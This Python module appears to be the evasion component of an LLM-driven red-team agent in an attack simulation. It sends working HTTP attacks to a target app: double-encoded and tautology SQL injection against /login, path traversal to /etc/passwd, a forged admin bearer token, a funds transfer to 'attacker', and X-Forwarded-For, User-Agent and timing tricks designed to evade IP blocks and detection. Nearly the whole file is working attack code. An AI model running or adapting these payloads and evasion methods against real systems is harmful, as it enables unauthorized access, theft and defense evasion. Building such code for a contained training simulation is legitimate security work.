"""
evasion.py — Encoding, timing, and header tricks to slip past naive defenses.

Embeds a real attack (SQLi login by default) inside evasive wrappers.
"""

from __future__ import annotations

import random
import time
from typing import Any, Dict
from urllib.parse import unquote

import httpx

from backend.state import AttackEvent, LLMDecision, SystemState

from . import exploit_helpers as eh

_CLIENT_TIMEOUT = httpx.Timeout(12.0)

# Encoded form of a classic tautology — we decode locally then POST JSON (KB009)
_DOUBLE_ENCODED_USER = "%2527%20OR%20%25271%2527%3D%25271"


def run(state: SystemState, llm_decision: LLMDecision) -> AttackEvent:
    """
    Routes by technique; unknown evasion labels fall through to exploit.run_generic.
    """
    technique = (llm_decision.get("technique") or "").lower()
    if technique == "sqli_double_encoded":
        return _run_double_encoded_sqli(state, llm_decision)
    if technique == "timing_mimic":
        return _run_timing_mimic(state, llm_decision)
    if technique == "ua_spoofing":
        return _run_ua_spoof(state, llm_decision)
    if technique == "header_injection":
        return _run_header_inject(state, llm_decision)

    from backend.agents.red.exploit import run_generic

    return run_generic(state, llm_decision)


def _run_double_encoded_sqli(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Applies up to 3x urllib unquote locally so the JSON body carries the real SQLi bytes (CWE-89).
    """
    pl = decision.get("payload") or {}
    raw = pl.get("username") or _DOUBLE_ENCODED_USER
    user = raw
    # Mirror server-side normalization: decode until stable
    for _ in range(3):
        nxt = unquote(user)
        if nxt == user:
            break
        user = nxt
    pw = pl.get("password", "")
    url = eh.target_url("/login")

    try:
        with httpx.Client(
            timeout=_CLIENT_TIMEOUT,
            headers=eh.merge_xff_headers(state, {}),
        ) as client:
            r = client.post(url, json={"username": user, "password": pw})
    except Exception as e:
        return _ev_fail("sqli_double_encoded", str(e))

    ok = r.status_code == 200
    return AttackEvent(
        type="sqli_double_encoded",
        target="/login",
        payload=f"decoded_len={len(user)}",
        result="success" if ok else "failed",
        evidence=f"HTTP {r.status_code} from_encoded={raw[:40]!r} → {r.text[:180]}",
        cwe="CWE-89",
        severity="critical",
        timestamp=time.time(),
    )


def _run_timing_mimic(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Lognormal delays between requests to mimic human jitter; then sends embedded attack.
    """
    # μ=0.8, σ=0.6 — irregular inter-arrival (spec)
    delay = random.lognormvariate(0.8, 0.6)
    time.sleep(min(delay, 5.0))

    pl = decision.get("payload") or {}
    user = pl.get("username", "admin' --")
    pw = pl.get("password", "")
    url = eh.target_url(decision.get("target_endpoint") or "/login")

    try:
        with httpx.Client(
            timeout=_CLIENT_TIMEOUT,
            headers=eh.merge_xff_headers(state, {}),
        ) as client:
            r = client.post(url, json={"username": user, "password": pw})
    except Exception as e:
        return _ev_fail("timing_mimic", str(e))

    return AttackEvent(
        type="timing_mimic",
        target="/login",
        payload=f"delay={delay:.2f}s",
        result="success" if r.status_code == 200 else "failed",
        evidence=f"HTTP {r.status_code} after human-like delay {r.text[:180]}",
        cwe="CWE-89",
        severity="medium",
        timestamp=time.time(),
    )


def _run_ua_spoof(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    Uses a browser User-Agent to evade behavioral fingerprinting (CWE-287).
    When localhost is IP-blocked, merge_xff_headers also adds XFF (first-layer bypass).
    """
    ua = (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )
    pl = decision.get("payload") or {}
    body: Dict[str, Any] = {
        "username": pl.get("username", "admin' --"),
        "password": pl.get("password", ""),
    }
    target_ep = decision.get("target_endpoint") or "/login"
    url = eh.target_url(target_ep)

    try:
        with httpx.Client(
            timeout=_CLIENT_TIMEOUT,
            headers=eh.merge_xff_headers(state, {"User-Agent": ua}),
        ) as client:
            r = client.post(url, json=body)
    except Exception as e:
        return _ev_fail("ua_spoofing", str(e))

    if r.status_code == 403:
        result = "blocked"   # IP-blocked; distinguish from technique failure
    elif r.status_code == 200:
        result = "success"
    else:
        result = "failed"

    return AttackEvent(
        type="ua_spoofing",
        target=target_ep,
        payload=ua[:60],
        result=result,
        evidence=f"HTTP {r.status_code} {r.text[:200]}",
        cwe="CWE-287",
        severity="medium",
        timestamp=time.time(),
    )


# Correct HTTP method per endpoint — never trust the LLM's method field for this
_ENDPOINT_METHOD: Dict[str, str] = {
    "/login":    "POST",
    "/transfer": "POST",
    "/data":     "GET",
    "/admin":    "GET",
    "/files":    "GET",
}

# Default attack payload/params per endpoint for the XFF bypass attempt
_ENDPOINT_DEFAULT_ATTACK: Dict[str, Any] = {
    "/login":    {"json": {"username": "admin' OR '1'='1' --", "password": ""}},
    "/transfer": {"json": {"amount": 1.0, "to": "attacker"}},
    "/data":     {"params": {"id": "1"}},
    "/admin":    {"params": {}, "extra_headers": {"Authorization": "Bearer admin"}},
    "/files":    {"params": {"path": "../../../etc/passwd"}},
}


def _run_header_inject(state: SystemState, decision: LLMDecision) -> AttackEvent:
    """
    X-Forwarded-For spoof — bypasses IP blocks when middleware trusts the header.

    Key design decisions:
    - Method is determined by the target endpoint, NOT the LLM's 'method' field
      (LLMs frequently output wrong methods; /login and /transfer are POST-only)
    - Uses rotating IP pool; skips recently-blocked IPs
    - Builds endpoint-appropriate payloads so the attack is meaningful after bypass
    """
    pl = dict(decision.get("payload") or {})
    pl.pop("x_forwarded_for", None)  # remove meta-field, not part of request body

    target_ep = (decision.get("target_endpoint") or "/login").rstrip("/")
    if not target_ep.startswith("/"):
        target_ep = "/" + target_ep

    spoof_ip = eh.pick_xff_ip_avoiding_recent_blocks(state)
    xff_headers: Dict[str, str] = {"X-Forwarded-For": spoof_ip, "X-Real-IP": spoof_ip}

    # Endpoint-aware method — never rely on LLM's method field
    method = _ENDPOINT_METHOD.get(target_ep, "GET")
    attack_spec = dict(_ENDPOINT_DEFAULT_ATTACK.get(target_ep, {"params": {}}))

    # Merge any extra headers (e.g. Authorization for /admin)
    extra_headers = attack_spec.pop("extra_headers", {})
    all_headers = {**xff_headers, **extra_headers}

    # LLM-supplied payload fields override defaults (e.g. specific username/amount)
    if pl:
        if "json" in attack_spec:
            attack_spec["json"] = {**attack_spec["json"], **pl}
        elif "params" in attack_spec:
            attack_spec["params"] = {**attack_spec["params"], **pl}

    # /transfer needs an auth token — obtain one via the spoofed IP identity
    if target_ep == "/transfer":
        try:
            with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=xff_headers) as login_client:
                lr = login_client.post(
                    eh.target_url("/login"),
                    json={"username": "admin' OR '1'='1' --", "password": ""},
                )
            if lr.status_code == 200:
                token = eh.extract_token_from_response_json(lr)
                if token:
                    all_headers["Authorization"] = f"Bearer {token}"
                else:
                    return _ev_fail("header_injection", "/transfer: login succeeded but no token")
            else:
                return _ev_fail("header_injection", f"/transfer: login via XFF returned {lr.status_code}")
        except Exception as e:
            return _ev_fail("header_injection", f"/transfer login error: {e}")

    url = eh.target_url(target_ep)
    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=all_headers) as client:
            if method == "POST":
                r = client.post(url, json=attack_spec.get("json", {}))
            else:
                r = client.get(url, params=attack_spec.get("params") or None)
    except Exception as e:
        return _ev_fail("header_injection", str(e))

    if r.status_code == 403:
        result = "blocked"
    elif r.status_code == 200:
        result = "success"
    else:
        result = "failed"

    return AttackEvent(
        type="header_injection",
        target=target_ep,
        payload=f"XFF={spoof_ip} {method} {target_ep}",
        result=result,
        evidence=f"HTTP {r.status_code} {r.text[:200]}",
        cwe="CWE-20",
        severity="medium",
        timestamp=time.time(),
    )


def _ev_fail(kind: str, err: str) -> AttackEvent:
    return AttackEvent(
        type=kind,
        target="/login",
        payload="",
        result="failed",
        evidence=err[:400],
        cwe="",
        severity="low",
        timestamp=time.time(),
    )
